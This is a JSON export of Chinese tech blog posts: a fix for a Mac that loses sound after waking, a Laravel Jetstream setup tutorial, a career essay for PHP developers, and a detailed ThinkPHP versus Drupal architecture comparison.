[{"title":"苹果电脑开盖唤醒后没有声音【解决方案】","url":"/2021/10/28/20211028-Mac 电脑开盖唤醒后没有声音【解决方案】/","content":"\n![在这里插入图片描述](https://img-blog.csdnimg.cn/5b3b5faa8796487fa40950d615151246.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\nMac合上盖子再打开后没声音了？这么诡异的问题，也不知道苹果是怎么想的。迟迟不给解决！\n\n下面我给出两个解决方案！\n<!-- more -->\n\n## 重启进程\n\n“command+空格“打开”聚焦搜索“，输入“活动监视器“，回车进入，在活动监视器右上方搜索窗口输入“coreaudiod“，选中下方搜索结果，再点击左上角那个叉号，就可以重启这个进程了，Mac声音就恢复了。\n\n![](https://pic2.zhimg.com/80/v2-17912f3e4a5460eeaae541966c371a61_1440w.jpg)\n\n![](https://pic2.zhimg.com/80/v2-a1590c1a55ade6d4dbf1d671d9294459_1440w.jpg)\n\n## 命令修复\n\n打开Mac终端，输入下述命令\n```bash\nsudo killall coreaudiod\n```\n回车，这时Mac会要你输入密码，直接输入再回车即可。","tags":["Laravel","php"],"categories":["代码笔记"]},{"title":"Laravel Jetstream 入门教程","url":"/2021/10/21/20211021-1/","content":"\n![](https://img-blog.csdnimg.cn/b09aafdd250a4c568197d5d11f78745a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n## laravel Jetstream 是什么？\n\n这是 Laravel 提供的一个可选的软件快速开发包。该软件开发包内部提供了登陆、注册、邮件认证、等软件开发的基本功能。可以帮助开发者快速集成系统功能，加速软件开发的效率。该软件开发包可以通过 Composer 引入。所以使用这个开发包之前，您需要有laravel 环境。\n\n<!-- more -->\n\n## 开始使用-Laravel-Jetstream\n\n\n###  开始安装 Laravel\n运行如下命令 ，[官网文档点我](https://laravel.com/docs/8.x#installation-via-composer)\n```php\ncomposer create-project laravel/laravel example-app\n```\n\n### 配置数据库相关信息\n编辑Laravel项目根目录下的.env 文件，\n\n```env\nDB_CONNECTION=mysql\nDB_HOST=127.0.0.1\nDB_PORT=3306\nDB_DATABASE=api.spc\nDB_USERNAME=root\nDB_PASSWORD=root\n```\n\n### 安装 Jetstream 开发包\t\n[官方文档点我](https://jetstream.laravel.com/2.x/installation.html#installing-jetstream)\n```php\ncomposer require laravel/jetstream\n```\n\n### 安装 Jetstream 模版 \n```php\nphp artisan jetstream:install inertia --teams\n```\n\n### 最后安装编译模版文件\n```php\nnpm install\nnpm run dev\nphp artisan migrate\n```\n\n### 启动服务器\nlaravel 项目根目录执行如下代码，\n```bash\nphp artisan serve\n```\n### 打开网站\n浏览器输入 http://127.0.0.1:8000 即可打开网站","tags":["Laravel","php"],"categories":["代码笔记"]},{"title":"PHPer你到底想要什么样的出路","url":"/2021/10/15/20211015-1-PHPer你到底想要什么样的出路/","content":"\n很多人都觉得职业规划是一个很虚飘的事情，其实不然。那些有着坚定奋斗方向并具备关键时刻扭转颓势的人一直都在前方奔跑。\n<!-- more -->\n\n做 Coding10 三年了，恰如每一个职场中人一样，遇到了需要转型的时刻，这个转型不在于个人的意志，而是大环境使然，这使得我们必须在必要的时间节点调整自己的职业规划。\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/6eacf178ef3d44689eb0f9b7956fbd43.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n\n\n\n做技术的人，不能太执念于技术，而是应执着于自己的目标和归途。有些公司，有些职业可以随遇而安，甚至彻底躺平。技术行当却绝不可以，那些在应用层求生存、求发展的人尤甚。\n\n\n\n记得 5、6 年前，移动互联网的超级爆发时期，满大街都是各种二维码。望京soho 街区甚至成为扫码一条街，壮观乎异常。当时就感概：“出来混，迟早是要还的”。\n\n我做 Coding10 是偶然，或许也是天意安排。07 年底一场病让我只能在家静养，百无聊赖、就把 Coding10 搭起来了，初始写写博客，还是很无趣，在用户怂恿下开始录视频，现在看早期的时候，依旧能感受到彼时自己病怏怏的状态。\n\n\n\n初做 Coding10 时，我把目标瞄向了 Laravel，因为在 PHP 这个圈子来说，这个开发框架是最合我胃口的，它追求的是开发效率的极致化，其实这也是 PHP 这门语言的天然基因优势，它帮开发者摒弃了各种限制和细节，让开发者专注于业务的开发，它的过度自由让它在前期澎湃发展，却也因过度自由而丧失了执行效率方面的竞争优势。这也恰如如今的世界，美欧为代表的国家崇尚所谓“自由”、“民主”，加之党派竞选制度，施政的效率、国家的整体规划能力相较于中国，必然是超大的势差。中国时刻都保持着对自己的绝对掌控，经过了13个五年计划，央企更是都被培养成了具备超级竞争力的利矛。\n\n\n\n在此我并没有贬低 PHP 或者说西方的体制。在国家执行力的层面来说，中国的体制优势谁也否认不了。就像我们用的编程语言一样，很多搞 PHP 的偏偏看不上 PHP，这是一个挺滑稽但是挺值得大家思考的事情。\n\n\n\n出现这个问题，主要就在于“年轻”，或者说开发者自身的目标不明确，没有对自己的职业做过任何的规划，因此对于自己手中的工具也不会有深刻的认识。\n\n\n\n最早我用的语言都是 C，C++，Java，这些语言都是强类型约束的，而这只是语言层面的约束，而使用这些语言的公司还有其它方面的约束，参数的命名，函数的命名、类的命名、文件夹的命名、文件的组织、库的生成、文档、注释等等都是有硬性规范的。包括项目管理更是如此，不管是瀑布、还是敏捷开发等等都具备极正规的流程把控的。在华为更是严苛，当初在华为终端新人必须还要经过这个规范的考核后才能接触初级的编码工作，我考了 3 次才通过。我就是在这种环境下开始并度过了自己的头 7 年职业生涯，当然不是在一个公司，而是我头七年所在的公司都是这种风格，只不过有了华为的折磨，后来的公司认定你必定是合格的，你已经形成了自我管理的习惯，也就完全没必要做无畏的考核了。\n\n\n\n接触后台 PHP 开发主要是曾经有项目为 LG 智能电视和现代车载系统做应用，我们一直做的都是客户端，客户端玩腻了之后，总觉得自己的脖子始终被后端卡着，我就奔向了所谓的 “全栈之路”。当初我有 Java 的基础，但是服务器端我没有使用 Java 的后台框架，原因非常简单，因为我自己的目标是成为自由职业，当时的 Java 后台框架都太重了，而使用 PHP，我甚至不用学它，因为有太多的 CMS 可以直接部署，所以 Wordpress 和 Drupal 都折腾过。但是我真的不喜欢它们，因为它们走了另外一个极端，你只能在它们提供的严格规范下工作，你必须采取一种非常丑陋的方式去定制它，去扩展它，而且把大量的时间消耗在处理无聊的兼容性和排错上，工程学上也毫无美感，就是在堆砌各种功能代码，并让它们勉强运行起，太多的层面不由自己掌控，这种感觉很让人沮丧，但 PHP 的开发效率却始终是我的最爱。\n\n\n\n后来我不爱用 PHP 了，就是因为它对于喜欢掌控开发过程和整体流程的人士来说不友好，对于公司来说也是如此，你无法使用它进行更好的团队协作。它太自由了，自由到很烂的代码也能跑起来。这绝对不符合公司们的需求，团队项目中非常核心的一个指标就是可控、可协同。而大部分 PHPer 对自己要求太低了，各方面对自己要求都很低，只要让项目跑起来就好，而没有更高的技术追求，至于为什么从未追究过。\n\n\n\n我重新回归是因为 Symfony 和 Laravel 这个框架以及 PHP Composer 带来的全新业态，这也是全球 PHP 圈子重新振作的一个非常标志。这让开发者能够主要自己的开发流程，企业也可以使用PHP进行更好的团队协作开发，自己也掌握了更佳的主动权，可以更好的优化和组织项目，项目的规划与执行能够结合，每一步都变得可控。，现代化的编程方式让人感觉也非常的爽，你可以好好打磨自己的技术，提升自己的能力，而且开发效率比过去还要高。\n\n\n\n然而在此期间，中国移动互联网的世界是另外一个天地，Java 天生就具备项目开发的各种优势，它是一门极其均衡的语言，生态发展得也非常健康，这对于大公司，大项目来说是佳偶良配，大型互联网公司选择 Java 可谓毫无意外。长达 10 多年的 PHP 衰落论从未间断得出现在每一个 PHPer 耳边，它并没有衰落，而是它一直都在自己应该在的土壤和环境中生存，那些超大型的项目为了项目的可控以及运行效率，不用 PHP 是极为正确的技术选型。就像七牛、B站选择 Go 重构自己的部分业务一样，是因为有些业务某些语言具备天生优势，它处理高并发就是高出其它语言一筹，实现方案简单易管控，能够让企业在服务器硬件节省几万台服务器资源，且提供更稳定可靠的服务，同时运维整个项目的成本也会大幅下降。每门语言都找到了自己的生存空间和生存土壤，可是很多开发者却没明白自己。\n\n\n\n选择 PHP 的开发者，一定要深知 PHP 的优势是什么，它的业态环境又是什么？目前 PHP 开发更适应中、小公司的业务；大公司使用 PHP 会用它做探索性、试验性项目的前期市场验证，可以肯定的说，大公司有 PHP 相关的职位，但是并不多。如果你的目标是大公司，那 PHP 真的不是一个好的切入点。\n\n\n\nJava 是一门均衡性语言，兼顾了开发效率、执行效率。更关键的是从业者有一个明确的技术线进行学习和提升，这让公司在招聘开发者的时候可以更好的考核开发者的能力水平，这也是大公司喜欢它的一个重要原因，这便于对开发者评级和定价。进一步保证了能够找到能力合适的人参与公司的项目，保证项目的可控和质量。开发者需要花费更多的时间和精力才能搞定它。\n\n\n\nGo 是 很多 PHPer 转型时走的另外一个极端，Go 的就业市场相较于 PHP 只低不高，大部分公司用它只是做辅助性的开发，而非主体语言。PHP 虽然执行效率上比不上 Java 和 Go，但是满足中小型项目却是绰绰有余，生态比 Go 也好很多。很多人转型选择 Go，无非就是因为它简单易学，或者说更重要的原因是跟风，被自媒体的风向所诱导。\n\n\n\n另外作为开发者，永远不要指望一门语言管咱们一辈子的饭，多学那么几门语言都是很正常的，不存在转不转的问题，为什么要把自己局限住，我们又不是美团、淘宝，它们逼着商家二选一是出于自身利益，我们逼着自己搞二选一干吗？坑自己吗？\n\n\n\n我们一定更要明确自己的目标，你追求什么样的目标，你就朝着什么方向去走，你就得借助能够达成这个目标的最有力的工具和手段。当你的目标和你目前的努力方式完全不同轨的时候，你每天都是痛苦的，渐行渐远的折磨极耗人的心神，甚至于你早上刚起，你就已经自己已经被掏空了。\n\n\n\n至于我为什么选择 PHP，那是因为我想成为一名自由职业者，我需要以最高的效率、尽可能多的时间把全局的技能全部掌握，PHP 能够让我更好达成这个目标，让我有更多的机会去跟人接触，跟外界的机会接触。\n\n\n\nPHPer 想在公司里拿高工资的只是少数，大部分人技术水平并不高，PHP 简单易用导致很多开发者对自己也很放纵，没有好好提升自己。很多工作多年的 PHPer 拿不到高工资也挺正常，想拿高工资，你就得提升自己，让自己在这个圈子有存在感，默默无闻没人会看重你。\n\n\n\n我们的目标也不是所谓的 “全栈工程师”，不是什么管理层，在国内公司们内卷的太厉害了，一批批的公司倒下，一批批的公司起来，然后又一批批的倒下、一批批的起来，你如何保证你到了下一家公司还是管理层？下一家公司又能存活多久？你的下下家呢？管理层的岗位会比技术岗更丰富？它只会更少，我们能走多远多高，不取决于咱们的技术水平，我们的个人品质和为人处世更重要。\n\n\n\n有点累了，咱们下次再聊吧，请大家记住一点，如果你选择了 PHP 并想长期走下去，你的目标不是全栈，而是成为一名自由职业者，而这也是 Coding10 转型重点要做的事情。元旦前 Flutter、小程序的内容我都会制作完成，让大家在前后端都能搞定，技术只是一方面，合理的规划和执行才是重中之重，有了技术上的优势，一定要转化为职业发展的优势，有了机会一定要去抓，觉得自己抓不住也要上，不上永远没机会。这事儿不像大家想的那么难，因为你身边就有很多这样的人，很多用户不也是看着我从零开始一步步做起来的吗？\n\n\n转自 https://mp.weixin.qq.com/s/afU3fdqgJNZnFrHg2ITLPg\n","tags":["php"],"categories":["代码笔记"]},{"title":"对比ThinkPHP和Drupal看中外软件业现状","url":"/2021/10/14/20211014-1-对比ThinkPHP和Drupal看中外软件业现状/","content":"\n\n由 云客 提交于 24 May 2021\n住房、结婚、医疗、教育、养老每一个都是一座大山，“搞钱”必须是头等重要的大事，谁有空搞开源？于是仅两个核心开发者打造的ThinkPHP成为了很多人的希望，而另外一边，没有“程序员是吃青春饭的”，开源软件社区聚会上常常见到五六十岁的人还在眼中带光的谈论技术，他们寻找生命的意义，不被生计太多打扰，将一生的积累注入到开源，他们梦想自己所做的能照亮世界，将人生化做伟大的作品伴随人类文明流传下去，于是Drupal被万众捧出，并急速驶向星辰大海。本文讲述了一个忧伤的故事，思考着看同种文字的人们该何去何从，这个故事应被更多人知道。\n\n<!-- more -->\n对比ThinkPHP和Drupal看中外软件业现状\n\n云客 20210511\n\n将ThinkPHP和Drupal（翻译成中文为“水滴”的意思）放在一起聊会让很多开发者感到好奇，但从中外软件生态发展来看，这真的是一个好的讨论起点，本文对这两系统在各方面都做了一些对比，但对比不是写作本文的主要目的，主要是分享中外软件行业的不同，以及由此引发的一些思考，帮助开发者规划职业生涯，为IT决策者提供决策依据。\n\n \n\n这两系统都是开源、免费的PHP应用，首先做个简要介绍：\n\nThinkPHP：\n\n产品定位：PHP开发框架，开发者在此基础上继续开发搭建自己的应用系统\n\n开发机构：由国内“上海顶想信息科技有限公司”开发\n\n创始人：刘晨，没有太多资料，百度查询为开源软件资深顾问，资深PHP程序员，看云CEO，超过15年的互联网产品开发和管理经验，主要研究领域包括Web应用架构和开发，产品用户体验设计，致力于国内的开源事业\n\n发展时间：最早诞生于2006年初\n\n开源协议： Apache 2\n\n官网地址：http://www.thinkphp.cn/\n\n用户群体：中国国内小微企业，在国内开发者圈中具有较高知名度，其官网自我描述为“是国内最有影响力的PHP框架和先驱者！”\n\n著名案例：56群组、联想问吧、中青旅开心遨游、宝矿力水特、星巴克、美特斯邦威的邦购商城、TCL的在线商城、新浪微坛，澳星、中车友科技等\n\n团队规模：没有官方数据，但框架的每个文件有作者信息，据此统计一共有7人，其中主要开发者有两人（贡献90%以上代码），这些数据不包括社区生态圈的贡献开发者，依据企查查平台对顶想公司查询结果显示，公司规模小于50人，参保人数3人\n\n系统文件：按目前的6.0.7版本算，初装文件数569个，占用空间2.41MB\n\n \n\nDrupal：\n\n产品定位：完整的后端系统（后端数据与控制中心），用于APP、小程序、网站、物联网等的后端开发\n\n开发机构：全球两百多个国家共建，Drupal基金会组织的非盈利开源社区\n\n创始人：最初由比利时的Dries Buytaert博士发起，Dries 2008年的大学博士论文是《Java应用程序性能分析和优化分析技术》，Java的发明者詹姆斯·高斯林(James Gosling)是其博士答辩委员会的成员，Dries个人主页地址https://dri.es/about\n\n发展时间：最早诞生于2000年\n\n开源协议：GPL 2.0\n\n官网地址：https://www.Drupal.org/\n\n用户群体：全球各国的企业、政府机构、大学、个人等，其中世界五百强企业市场占有率超过80%，著名IDE:phpstorm直接集成了Drupal项目新建\n\n著名案例：国内有：华为、京东、百度、腾讯、清华、北大、贵州市政府站群、真功夫等，国外有：特斯拉、谷歌、本田、高通、联合国、欧盟、哈佛大学、麻省理工大学、迪士尼、NASA、辉瑞制药等\n\n团队规模：\n\n拥有全球最大最活跃的开源社区，核心开发者1800余人，处于活跃状态的贡献者（代码、文档、设计等人员）共有超过12万人，其中中国分社区两千余人，主力推动公司Acquia雇员超过1100人。当前平均每周产生1300次左右代码提交。\n\n系统文件：按目前的9.1.7版本算，初装文件数18770个，占用空间71.2MB\n\n \n\n为什么是ThinkPHP和 Drupal：\n\n一个是中国国内的流行框架，一个是国际流行的完整后端系统（也是目前世界上最强大灵活的系统，没有之一），从它们的体量看这完全不在一个重量级，从其市场定位看，也没有比较的意义，但探索它们对了解中外软件生态具有重要意义，此外如果直接告诉你ThinkPHP能做的事情，Drupal都能做，而且还更加优雅和简洁呢？事情是不是就变的很有意思了，继续。\n\n通常使用Drupal的国内开发者都是有很多年经验的开发老手，是伴随时代从各种系统一步一步淌出来的，他们一定知道或多少了解ThinkPHP，但使用ThinkPHP的开发者却不一定了解Drupal，使用ThinkPHP的开发者选择ThinkPHP的理由一般是：框架较底层PHP进一步的提供了常用基础，灵活自由，和对帝国CMS这样的系统进行二次开发相比，不受限制，能够随意实现自己的功能，但是在Drupal面前，事情就变的不一样了，可能会让开发者有如获至宝的感觉，在此需要先简要介绍一下Drupal的系统架构，整个Drupal系统是分层建设的：\n\n最底层：\n\n是框架层，基于流行的Symfony框架，Symfony可谓是PHP的行业标准，是世界最著名的框架，另一个著名的PHP框架Laravel本身很多部分也都是基于或来自Symfony，懂得Symfony框架的开发者可以很快上手开发Drupal，Symfony框架的作者法比安是一个传奇人物，其另一个广为人知的作品是Twig模板引擎，该引擎也用在Drupal中，Drupal是Symfony最著名的案例，其官网将Drupal列在第一位，Drupal社区也参与Symfony的代码贡献。\n\n第二层：\n\n是数据层，以实体为代表，向上提供各种数据，数据库封装即属于该层，ORM概念以及ThinkPHP中的模型概念类似于实体概念在很早很早时期的样子\n\n第三层：\n\n应用层，开发者在这一层处理各种业务逻辑\n\n这里需要注意开发者在使用Drupal时，不一定要一层一层往下调用，而是可以跨越，直接去面向某一层，所以当直接面向框架层开发时，就可以将整个系统当做框架来使用，就像ThinkPHP开发者直接使用ThinkPHP框架一样，这就是为什么说ThinkPHP能做的Drupal都能做的原因，所不同的是Drupal采用Symfony框架，题外话ThinkPHP深受Symfony影响，甚至直接采用了其部分组件，许多方面高度借鉴了Symfony框架（任何创造者都值得尊敬，因此不用“抄袭”这个词，而用“借鉴”），主干流程几乎相同，但在成熟度和细节上相差甚远，这种差距举个例子来形象的说明：\n\n当人类先祖在结绳计数的那个时代，一个果子就是一个果子，一条鱼就是一条鱼，当从一个个具体事物中抽象出背后的数字“1”时，人类就面临了一次巨大的飞跃，此刻的意义不亚于火的使用，进而发明数字、数学等，在时间和空间上，人类一直处于对世界的不停探索、抽象之中，无数次累积才有了今天的文明，可以说抽象程度越高，意味着越强，越直达本质。\n\n许多伟大的作品都需要巨大的人力和时间去积累，那么ThinkPHP和Symfony之间，或者说ThinkPHP和Drupal之间积累的差距有多大呢？这里可以直接果断的告诉你是小学和大学之间的差距，中间还隔着初中、高中，主要原因在于社区规模、生态和时间上。ThinkPHP和Symfony同为框架，是最直接的竞争者，ThinkPHP要有存在的必要就需要一条自主创新的路，却又大量借鉴Symfony，这是一件非常尴尬的事情，作为开发者为什么不直接使用Symfony呢？同级别的CI框架（CodeIgniter）就完全自主发展，在许多全球排名中都看不到ThinkPHP的影子，但在国内，你可以在很多招聘信息中看到ThinkPHP的影子，这是个很奇特的现象，因为ThinkPHP是一个十足的地方性产品，连注释文档都是中文，本文也正是基于此才选择了ThinkPHP来作为研究中外软件状态的起点。\n\n \n\n何为好系统？我们需要什么？\n\n俗话说工欲善其事必先利其器，这里列出几个点来说明一个优秀的系统应该具备什么特性，下文我们将以此来对比ThinkPHP和Drupal：\n\n完备性：\n\n所谓完备性你可以认为是某个工具或组件被设计出来已经充分考虑到了所有的情况，比如PHP原生提供的字符串截取函数会把UTF-8字符截断，产生乱码，而你设计了一个截取函数，不但不会这样，还不会截断英文单词，还考虑到了不截断HTML中的标签，那么你这个工具就比PHP原生函数更加完备，一旦发现有满足不了的用列就需要改进以提高完备性，Drupal很多地方的设计是“完备”的，尽管Drupal也在持续探索和进化，但这种完备程度远超ThinkPHP，举个例子，Drupal的路由系统可以天然支持基于域名、协议、HTTP方法、数据格式、选项等进行路由，在都匹配的情况下有优先级分级，而这些是ThinkPHP不完全具备的，这种组件设计上的完备依赖于对事务本质认知的深度和大量开发经验，完备性让人类站在前人的基础上继续前行。\n\n标准化：\n\n标准化是大规模协作的前提，系统分层结构、跨系统通讯、解耦组件等都离不开标准化，Drupal完全面向RFC文档，而不是自成体系，在注释或讨论中经常看到对RFC的引用，RFC文档是IT互联网的基石，类似在产品上常见的国家标准，常被用户忽略，但又异常重要。\n\n完整性：\n\n合作分工，当把发展的足够完备的组件凑到一起，大家都来使用它们，这就构成了完整性，然后人们不必自己再重复造轮子，突破内卷，完整性也会反过来促使完备性的提高，Symfony和Drupal就以组件和模块的方式来解决完整性问题。\n\n低耦合性：\n\n系统设计各组件间需要尽可能解耦，这样就能给各组件更多的发展提高的空间，不好的组件也便于替换，Drupal采用模块化设计，连核心都是模块化的，用户可以在用户空间中替换任何核心文件，而不直接修改，避免功能不足和阻碍升级，相对而言ThinkPHP耦合较紧。\n\n掌握边界：\n\n一个好的系统势必是分寸拿捏得当的系统，但这真的有点难，且仁者见仁智者见智，总的来看大方向或者主干系统必须是简洁的，这里举一个例子，在ThinkPHP中支持按路由参数决定路由控制器，即：Route::get(':action/blog/:id', 'Blog/:action');，而Drupal不允许这样做，实现类似功能时通常采用代理控制器实现，简而言之即该效果不应该在路由层面实现，而应该在控制器层面实现，这样使得路由系统更加简洁，系统架构更加清晰，这种思想贯穿Drupal，使得Drupal系统主干十分简单干净，当你要某个细化功能时，首先进入对应大支流再进入到不同的细化支流当中，是不是像一颗树？但你更喜欢哪种方式呢？\n\n简洁性：\n\n大道至简，系统需要流程清晰，调用统一，规则一致，不允许有另外，或尽量避免另外，这样的好处是易于新人学习，并且追踪、排查都很方便。\n\n生命力：\n\n系统的生命力也在于可持续性，生态圈和开发者就是系统的养料，下文还会讲到，这里略过。\n\n \n\n对比ThinkPHP和Drupal：\n\nThinkPHP和Drupal相比总的来说，在于ThinkPHP抽象程度不足，积累不足，这是根本上的不足，它像一个孩子，Drupal是一个经历岁月的成年人，懂得更多，知道事物背后蕴含的通用道理，做的也更进一步，假设我们是在建造一栋大厦，ThinkPHP提供了混凝土、砖块、钢筋等等建筑基础材料，开发者需要去探索如何修建，如何设计等建筑学问题，而Drupal不但提供了基础材料，还附带了施工队和设计院，很多时候你只需要说出你要什么样感觉和功能的大厦就行了（你遇到的需求，通常已经有人遇到过，形成了数量庞大的贡献模块，安装即可），当然如果你有兴趣，你也可以参与修建的过程得到你自定义的结果。\n\n本章在技术架构层面上来对比二者，如果你不是开发者，或者对具体技术不感兴趣，可以直接跳过本章，接着看下一章，这里都以当前各自最新的版本ThinkPHP 6.0.7和Drupal 9.1.7，由于篇幅有限，仅选择部分重要内容进行对比：\n\n事件：\n\n在ThinkPHP中将事件定位为替代原来的行为和Hook机制，由此可见作者并没有认识到事件和钩子之间的本质区别，相同点都是用第三方代码来介入当前逻辑的处理，但在这个大前提下钩子重参与，事件重通知，它们在数量和性质上都有很大不同，ThinkPHP将其混为一谈，而Drupal认识的更加本质，由于ThinkPHP对“事件”概念的认识不足也导致实现上松散复杂，且功能上有重大不足，比如ThinkPHP事件没有优先级概念，这在有顺序要求的情况下至关重要，同时也没有事件传播终止机制，又比如ThinkPHP可以不要求实现事件类，实际上要处理事件通常必须要有参数传递，且需要将处理结果反馈给事件发源地，因此事件类是必须的，ThinkPHP非常初浅，而Drupal中统一采用事件派发器服务处理所有事件，对订阅器和侦听器也无特殊限制，在系统任何地方处理事件相关逻辑只需要面对事件派发器服务即可\n\n \n\n中间件：\n\n在ThinkPHP和Drupal中都有“中间件”概念，但二者定位有很大不同，在ThinkPHP里中间件实现的功能，在Drupal中是由事件派发器负责的，比如ThinkPHP文档提到中间件主要用于拦截或过滤应用的HTTP请求，这在Drupal中是派发请求事件做的事情，此外还有路由中间件、控制器中间件都是如此，它们对应路由事件、控制器事件，而Drupal中的中间件主要作用是将HTTP处理核心由一个变成多个，在逻辑架构上Drupal要比ThinkPHP优雅和清晰很多，这也是ThinkPHP对事件机制理解不足导致的，这让系统结构杂乱了，为将来的升级埋下了包袱\n\n \n\n入口文件：\n\n两者的入口文件都很简单，逻辑也比较类似，区别主要有三点：\n\n1、Drupal直接在入口文件中向处理核心注入请求对象，从字面上直接体现“任何web系统都是将请求转化为响应的系统”这一理念，而ThinkPHP的HTTP服务的run方法虽然也可以，但没有在入口处体现，但这点没什么本质区别，区别大的是ThinkPHP缺乏对“子请求”功能的支持，即系统运行过程中向自己再提交请求进行处理的能力，不需要跳出系统再回来，该功能对系统架构影响很大（贯穿整个体系，子请求除不能影响到主请求的环境状态外还要考虑性能），此一点最能看出Drupal的系统架构比ThinkPHP强大太多，完备性高出不少，Drupal更能应对复杂的业务逻辑\n\n2、真正的大道至简，Drupal全局只有一个入口文件，不管是多应用，还是单应用的前后台等，都只有一个入口，虽然用户可以设置多个，但并不推荐多个，这减少复杂性保持简单，且为URL别名系统打下基础，而ThinkPHP有复杂的多入口机制，在多应用时尤其如此，这也对URL别名的支持会较困难\n\n3、Drupal在初始状态下将类加载器传递到处理核心中，这就天然支持替换或修改类加载器，而ThinkPHP不支持，它只是加载而已，当需要修改类加载器时，无法获取，这一点导致灵活性大打折扣，比如很多类不能替换为用户自己的，比如你要替换“\\think\\Http”类就比较麻烦。\n\n \n\n多应用：\n\n两者都支持多应用，即多个系统复用同一套代码，但具体做法上Drupal要简洁的多\n\n \n\n面向接口编程：\n\n在ThinkPHP的很多实现中，对类没有提取出接口，甚至有些重要类也没有接口，比如：\n\n\\think\\App\n\n\\think\\Request\n\n它们是如此核心和重要，但都没有自己的独立接口，ThinkPHP不是严格按照接口编程的，在灵活性上大打折扣，比如我想实现一个自己的app类去替换\\think\\App就做不到了，只能去修改核心，这样每次升级是个问题，而在Drupal中是严格按照接口的，架构上完全面向接口，参数类型约束全部是接口，我们可以替换核心提供的任何类，而不必修改核心，包括最为重要的HTTP核心类：DrupalKernel，该类类似ThinkPHP的app类。\n\n不严格按照接口编程除影响扩展性外，还有诸多其他坏处，比如对IDE不友好，文档提取自动化难，代码注释无继承，协作讨论不方便等等\n\n \n\n路由系统：\n\n引用ThinkPHP官方教程的一句原文：\n\n“ThinkPHP并非强制使用路由，如果没有定义路由，则可以直接使用“控制器/操作”的方式访问”\n\n可见框架作者对路由的本质认识不足，如前文所述尚未抽象出数字1来，所说的“控制器/操作”的方式也应属于默认路由或者内部路径路由，而不是不用路由，看似无伤大雅的一点其实很重要，涉及本质认知，进而导致行为很不一样。\n\n路由是进入系统后的分岔路口，必定存在，许多业务逻辑都需要在这里处理，比如权限控制、参数转化、路径别名处理、语言处理等等，在ThinkPHP中认为可以没有路由，这导致了另外，这样的认知结果势必将事情变的松散和复杂，比如代码冗余、使用不统一等。\n\n而入口处理只是路由的两大功能之一，另一大功能是出口处理，也就是全系统URL的生成，这对URL别名处理、语言协商、SEO等至关重要，但ThinkPHP中只有简单的实现，尚未充分认识到路由系统的该责任，比如这里提出一个需求：\n\n用户在一个自定义函数中给全系统的URL加上“target=\"_blank\"”怎么实现？\n\n \n\n容器与依赖注入：\n\n该概念和叫法起源于Symfony框架，详见：\n\nhttps://symfony.com/doc/current/components/dependency_injection.html\n\n简而言之其主要思想是在系统中设置一个中央大对象，也可以叫做母对象，其负责收集、保存、自动实例化我们常用的对象，在Symfony中，这个大对象称为容器，其中保存的对象称为服务，服务的定义可以采用YAML静态提供或服务提供器方式动态提供，“定义”具备一定的格式，当我们需要某服务时，容器对象会依据定义去实例化服务对象，然后保存并返回，定义中涉及类、参数、工厂方法、实例化后回调、配置器、公私有属性、特征继承、延迟实例化等概念，容器形成前还会有服务编译过程，以便处理服务组群、参数修改等高级功能，在容器中每一个服务都有一个ID，称为服务ID，在使用之处通过该ID取得服务对象，容器中除了保存服务外还保存容器参数、服务别名等。\n\nThinkPHP的容器概念有Symfony的影子，但还非常幼小和初级，其实现离大道至简相去甚远，较混乱，比如没有明确的服务ID概念，在Symfony容器里的服务对象，必有对应的服务ID，而ThinkPHP将类似概念称为abstract，其可以是标识符或者类名，但部分容器方法又将其视为类名使用，比如：\n\n\\think\\App::register\n\n\\think\\App::getService\n\n看起来作者是想尽可能灵活，但却导致了由不统一引发的混乱，在ThinkPHP中“服务”概念有单独的定义（有点像操作系统的服务），但本质上还是Symfony服务，只是进行了特殊处理，在Symfony中将服务放到容器里面叫做对服务进行“收集”，或者叫“注入”到容器，而ThinkPHP称为将服务“绑定”到容器，顾名思义容器就是用来装东西的，为什么要叫绑定呢？这种叫法非常拗口，还有很多名字也词不达意，比如运行容器中对象的实例化后操作，ThinkPHP称为“执行后”操作，而不叫“实例化后”操作，计算机界有句名言：“什么难？缓存和命名”，在这一块上ThinkPHP需要改进，现在的一些命名对新手不友好。\n\n另外服务（在ThinkPHP中应该称为绑定到容器中的类、对象或回调才对）又可以向容器绑定服务这个特性看起来灵活，但是对代码追踪和调试非常不友好，增加新人接手系统的难度，而Drupal得益于模块化设计，使得可以做到集中声明（因为模块必定知道服务会依赖哪些服务，通过容器编译机制也可以判断某服务是否存在），这样在追踪代码和调试时就做到了尽可能简单，导出运行时容器中的服务定义也很方便，不用真的去实例化每个服务。\n\n \n\n门面Façade：\n\n这只是ThinkPHP中的概念，用来以静态方式调用被包装类的动态方法，即用静态方式代理类到方法级别，这只是形式上的调整，内部依然需要实例化对象，其实该概念并没有存在的必要，不但对IDE十分不友好还违背了PHP静态方法设计初衷，只是弥补了ThinkPHP中容器功能的不足，在Drupal中无此概念，其功能目的是统一采用\\Drupal::service($id)静态方法获取服务实例，进而由开发者自行调用其动态方法，如需不同实例则自行克隆，这也避免了use引入代理类的麻烦。\n\n \n\n助手函数\n\nThinkPHP中有个助手函数的概念，文档提到其目的是享受IDE自动提醒的便利，这相当于Drupal中的“\\Drupal”全局类提供的静态方法，或者快捷函数，但Drupal并不是因为IDE，而是更加便捷的获取服务，因为PHP函数或静态类方法是超全局可用的。\n\n \n\n控制器和模型：\n\n在ThinkPHP中认为控制器是用来做业务处理前逻辑的，必须是一个php类或闭包，业务逻辑是“模式器”的事情，其实这是很僵化教条的一点，首先控制器可以是任何形式表示的php回调，包括函数、容器实例的方法（用容器ID进行定义）等，其次现实中业务逻辑的边界并没有那么清晰，很难抽象出“模式”然后还能给出这个名字，再次控制器应该已经是业务处理的开始，而ThinkPHP概念中的控制器所做的事情应该是在路由中处理，这一点ThinkPHP已经意识到了，并在文档中一笔带过。\n\n 